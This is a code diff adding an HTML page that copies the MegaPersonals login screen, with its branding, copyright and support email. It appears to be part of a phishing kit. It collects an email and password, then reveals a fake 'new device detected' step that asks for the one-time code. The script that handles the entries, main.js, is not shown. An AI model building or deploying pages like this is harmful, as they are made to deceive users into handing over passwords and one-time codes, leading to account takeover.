@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Megapersonalcsa</title>
+  </head>
+  <body>
+    <div class="text-center lg:w-4/12 w-full px-4 m-auto">
+      <div class="py-5 my-4">
+        <img
+          class="lg:w-full w-8/12 m-auto"
+          src="./images/megapersonals.png"
+          alt=""
+        />
+      </div>
+
+
+  <div id="loginSystem">
+    
+    <div class="py-3">
+      <h1 class="text-lg py-2 text-slate-500">
+        Is this your first time posting?
+      </h1>
+
+      <button
+        class="px-6 py-2 w-8/12 m-auto rounded-md block bg-[#0492FF] font-bold text-2xl text-white"
+      >
+        Start Here
+      </button>
+    </div>
+        <div class="py-5 my-2">
+          <h1 class="text-xl text-slate-500">Already have a login?</h1>
+  
+          <h1 class="text-2xl py-1 text-slate-500">Login</h1>
+  
+  
+          <form >
+            <div class="py-2">
+              <input
+                class="px-4 rounded-md text-sm w-full block"
+                required
+                type="email"
+                name=""
+               
+                placeholder="Email"
+              />
+            </div>
+  
+            <div class="py-2">
+              <input
+                class="px-4 rounded-md text-sm w-full block"
+                required
+                type="password"
+                name=""
+              
+                placeholder="Password"
+              />
+            </div>
+  
+            <img class="w-6/12 m-auto" src="./images/captcha.webp" alt="" />
+  
+            <div class="py-2 mb-1">
+              <input
+                class="px-4 rounded-md text-sm w-full block"
+                required
+                type="text"
+                name="code"
+                id="code"
+              />
+            </div>
+            <small class="text-red-700 font-bold hidden errors" >Please enter your
+              password</small>
+  
+            <input
+              type="submit"
+              name="submit"
+              class="py-2 px-6 my-1  inline-block bg-yellow-500 text-2xl text-white"
+              value="submit"
+            />
+
+          </form>
+  
+          <div class="py-2">
+            <img class="w-10/12 m-auto" src="./images/warning.webp" alt="" />
+            <a class="block p-2 text-slate-500 hover:underline text-sm" href="/"
+              >Forgot Password</a
+            >
+            <h1 class="text-slate-500 text-sm pt-4">
+              <a class="inline-block" href="/">Home </a>
+              |
+              <a class="inline-block" href="/">Contact Us </a>
+              |
+              <a class="inline-block" href="/">Policies & Terms </a>
+            </h1>
+            <div class="p-3 pb-0">
+              <a class="inline p-2 hover:underline text-sm" href="/"
+                >Report Bug</a
+              >
+            </div>
+            <p class="text-sm p-1 text-slate-500">
+              Copyright ©2021 MegaPersonals.eu
+            </p>
+            <p class="text-sm p-1 text-slate-500">
+              For support email
+              <button class="text-slate-900">support@megapersonals.eu</button>
+            </p>
+          </div>
+        </div>
+      </div> 
+
+      <div id="otpSystem" style="display: none;" class="hidden">
+        <div class="py-5 my-2">
+          
+          <h2 class="bg-[#F8EFCE] text-gray-400 font-bold text-2xl py-3">NEW DEVIECE DETECTED</h2>
+          <p id="access-code" class="mt-6 text-xl text-[#C75400] text-center"></p>
+          <p class="mt-5 text-center text-xl italic font-bold text-[#2FAEEA] uppercase">CHECK YOUR SPAM <br> FOLDER IT MAY BE THERE.</p>
+          <p class="mt-7 flex items-center justify-center gap-3  text-xl text-[#C75400] text-center font-bold italic uppercase"><span>DO NOT SHARE IT</span><span class="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic"><span>?</span></span></p>
+          <p class="mt-5 text-xl text-[#C75400] text-center ">Enter the code <br> below to continue.</p>
+  
+          <form >
+            <div class="py-2">
+              <input
+                class="px-4 rounded-md text-sm w-full block"
+                required
+                type="text"
+                name=""
+               
+                placeholder="OTP Code"
+              />
+            </div>
+
+
+  
+            <input
+            class="py-2 px-6 my-1  inline-block bg-yellow-500 text-2xl text-white"
+            type="submit" name="submit" 
+              value="submit"
+            />
+
+          </form>
+  
+        </div>
+      </div>
+
+    </div>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="main.js"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              clifford: "#da373d",
+            },
+          },
+        },
+      };
+    </script>
+    <style type="text/tailwindcss">
+      @layer utilities {
+        .content-auto {
+          content-visibility: auto;
+        }
+      }
+    </style>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+  </body>
+</html>
